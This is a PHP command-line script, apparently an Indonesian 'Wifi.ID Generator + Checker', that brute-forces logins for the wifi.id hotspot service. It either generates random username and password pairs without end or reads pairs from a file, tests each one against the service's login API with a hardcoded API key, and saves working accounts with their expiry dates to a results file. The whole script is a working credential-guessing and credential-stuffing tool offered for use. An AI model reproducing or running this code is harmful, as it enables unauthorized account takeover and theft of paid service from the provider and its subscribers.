<?php
date_default_timezone_set('Asia/Jakarta');

$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'X-Api-Key: 8d446f02-ef8d-47b2-9663-dbe75b016fb9';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Cache-Control: max-age=0, no-cache';
$headers[] = 'Pragma: no-cache';

echo color('blue','[+]')." ===============================\n";
echo color('blue','[+]')." Wifi.ID Generator + Checker\n";
echo color('blue','[+]')." Created By: Gidhan Bagus Algary\n";
echo color('blue','[+]')." ===============================\n";
echo color('blue','[+]')." 1. Generate -> Check\n";
echo color('blue','[+]')." 2. List Txt -> Check\n";
echo color('blue','[+]')." ===============================\n";
echo color('blue','[+]')." Silahkan pilih: ";
$tools = trim(fgets(STDIN));


if ($tools == '1') {
	echo "\n";
	while (1) {
		$base = array("9811", "9821", "9822", "9852", "9853");
		$awal = array_rand($base);
		$awal = $base[$awal];

		$user = $awal.random(11,0);
		$pass = random(3,1);
		check($user,$pass);
	}
} elseif ($tools == '2') {
	echo color('blue','[+]')." Input File: ";
	$xyz = trim(fgets(STDIN));
	$list = file($xyz);
	echo "\n";
	foreach ($list as $akun => $data) {
		$split = explode("|", $data);
		$user = trim($split[0]);
		$pass = trim($split[1]);
		check($user,$pass);
	}
} else {
	die("Yang benerlah goblok!");
}

function check($user,$pass)
	{
		global $headers;
		$gas = curl('https://caramel.wifi.id/api/ott/v2', '{"username":"'.$user.'","password":"'.$pass.'"}', true, $headers);
		$res = json_decode($gas[1]);
		if ($res->act !== 'INVALID') {
			echo color('green','[LIVE]')." $user|$pass - Exp: ".date("d M Y H:i:s", strtotime($res->expire))." WIB\n";
			$file = "wifi-result.txt";
			$handle = fopen($file, 'a');
			fwrite($handle, "$user|$pass - Exp: ".date("d M Y H:i:s", strtotime($res->expire))." WIB\n");
			fclose($handle);
		} else {
			echo color('red','[DIE]')." $user|$pass\n";
		}
	}

function color($color = "default" , $text)
    {
        $arrayColor = array(
            'red'       => '1;31',
            'green'     => '1;32',
            'blue'      => '1;34',
        );  
        return "\033[".$arrayColor[$color]."m".$text."\033[0m";
    }

function random($length,$a) 
	{
		$str = "";
		if ($a == 0) {
			$characters = array_merge(range('0','9'));
		}elseif ($a == 1) {
			$characters = array_merge(range('a','z'));
		}
		$max = count($characters) - 1;
		for ($i = 0; $i < $length; $i++) {
			$rand = mt_rand(0, $max);
			$str .= $characters[$rand];
		}
		return $str;
	}

function curl($url, $fields = false, $headers = false, $httpheaders = false)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        if ($fields != false) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
        }
        if ($httpheaders != false) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheaders);
        }
        $result   = curl_exec($ch);
        if ($headers != false) {
    		$header = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
    		$body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
        } else {
        	$body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
        }
        curl_close($ch);
        if ($headers != false) {
        return array($header,$body);
        } else {
        return array($body);
        }
	}